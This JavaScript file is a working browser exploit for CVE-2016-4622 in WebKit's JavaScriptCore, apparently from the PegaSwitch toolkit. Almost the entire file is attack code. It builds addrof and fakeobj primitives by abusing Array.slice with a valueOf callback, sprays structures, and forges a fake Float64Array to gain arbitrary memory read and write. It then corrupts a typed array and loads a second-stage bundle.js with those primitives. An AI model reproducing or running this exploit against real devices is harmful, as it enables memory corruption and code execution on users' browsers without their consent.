/* eslint no-redeclare: "off" */
/* eslint no-unmodified-loop-condition: "off" */
/* global XMLHttpRequest, alert, ImageData, postMessage, history */
function send (ep, data) {
    var msg = {
        msg: data
    };
    var jsonstr = JSON.stringify(msg);
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/' + ep, false);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(jsonstr);
    } catch (e) {

    }
}

function log (msg) {
    send('log', msg === undefined ? 'undefined' : msg.toString());
}

window.onerror = function (msg, url, line) {
    if (msg === 'Out of memory') { alert(msg); }
    send('error', [line, msg]);
    //  location.reload();
};

var _dview;
function u2d (low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(8));
    _dview.setUint32(0, low, true);
    _dview.setUint32(4, hi, true);
    return _dview.getFloat64(0, true);
}

function d2u (d) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(8));
    _dview.setFloat64(0, d, true);
    return [_dview.getUint32(0, true), _dview.getUint32(4, true)];
}

function d2b (d) {
    var buf = new ArrayBuffer(8);
    var f64_buf = new Float64Array(buf);
    f64_buf[0] = d;
    return Array.from(new Int8Array(buf));
}

/*
*   Exploit module for CVE-2016-4622.
*
*   Copyright (c) 2016 Samuel Gro√ü
*   Copyright (c) 2018 PegaSwitch
*/

/* Utility functions. */
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

var Struct = (function() {
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;
            byteView.set(bytes);
            return view[0];
        },

        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

/* Datatype to represent 64-bit integers. */
function Int64(v) {
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    this.asDouble = function() {
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    this.bytes = function() {
        return Array.from(bytes);
    };

    this.byteAt = function(i) {
        return bytes[i];
    };

    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

function Neg(n) {
    return (new Int64()).assignNeg(n);
}

function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

/* Core exploit primitives. */
function addrof(object) {
    var a = [];
    for (var i = 0; i < 100; i++)
        a.push(i + 0.1337);

    var b = a.slice(0, {valueOf: function() { a.length = 0; a = [object]; return 4; }});
    return Int64.fromDouble(b[3]);
}

function fakeobj(addr) {
    var a = []
    for (var i = 0; i < 100; i++)
        a.push({});

    addr = addr.asDouble();
    return a.slice(0, {valueOf: function() { a.length = 0; a = [addr]; return 4; }})[3];
}

window.minmain = function minmain () {
    var structs = [];
    function sprayStructures() {
        function randomString() {
            return Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
        }
        for (var i = 0; i < 0x1000; i++) {
            var a = new Float64Array(1);
            a[randomString()] = 1337;
            structs.push(a);
        }
    }

    sprayStructures();

    var hax = new Uint8Array(0x1000);

    log("[*] Setting up container object");

    var jsCellHeader = new Int64([
        00, 0x10, 00, 00,
        0x0,
        0x27,
        0x18,
        0x1
    ]);

    var container = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: false,
        vector: hax,
        lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()
    };

    var address = Add(addrof(container), 16);
    log("[*] Fake JSObject @ " + address);

    var fakearray = fakeobj(address);

    while (!(fakearray instanceof Float64Array)) {
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        container.jsCellHeader = jsCellHeader.asJSValue();
    }

    log("[*] Float64Array structure ID found: " + jsCellHeader.toString().substr(-8));

    memory = {
        read: function(addr, length) {
            log("[<] Reading " + length + " bytes from " + addr);
            fakearray[2] = addr.asDouble();
            var a = new Array(length);
            for (var i = 0; i < length; i++)
                a[i] = hax[i];
            return a;
        },

        readInt64: function(addr) {
            return new Int64(this.read(addr, 8));
        },

        write: function(addr, data) {
            log("[>] Writing " + data.length + " bytes to " + addr);
            fakearray[2] = addr.asDouble();
            for (var i = 0; i < data.length; i++)
                hax[i] = data[i];
        },

        writeInt64: function(addr, val) {
            return this.write(addr, val.bytes());
        }
    };

    var empty = {};
    var header = memory.read(addrof(empty), 8);
    memory.write(addrof(container), header);

    var f64array = new Float64Array(8);
    header = memory.read(addrof(f64array), 16);
    memory.write(addrof(fakearray), header);

    memory.write(Add(addrof(fakearray), 24), [0x10,0,0,0,1,0,0,0]);

    log("[+] All done!");

    fakearray.container = container;
    
    /* Re-use old exploit flow with the new primitives. */
    var view_a = new Uint32Array(0);
    var fobj_a = new Uint32Array(0);
    var fobj_b = { b: 0 };

    var view_a_addr = addrof(view_a); 
    var view_a_vect = addrof(fobj_a);

    memory.write(Add(view_a_addr, 0x10), d2b(view_a_vect.asDouble()));
    memory.write(Add(view_a_addr, 0x18), [0x08,0x00,0x00,0x00,0x01,0x00,0x00,0x00]);
  
    view_a[7] = 1;

    log('Success!');
        
    loadRun({
        va: view_a,
        vb: fobj_a,
        leakee: fobj_b,
        leakaddr: d2u(addrof(fobj_b).asDouble()),
    });
};

function loadRun (obj) {
    window.exploitMe = obj;
    var elem = document.createElement('script');
    elem.setAttribute('src', 'bundle.js');
    document.body.appendChild(elem);
}

setTimeout(function () {
    document.getElementById('test').click();
}, 100);
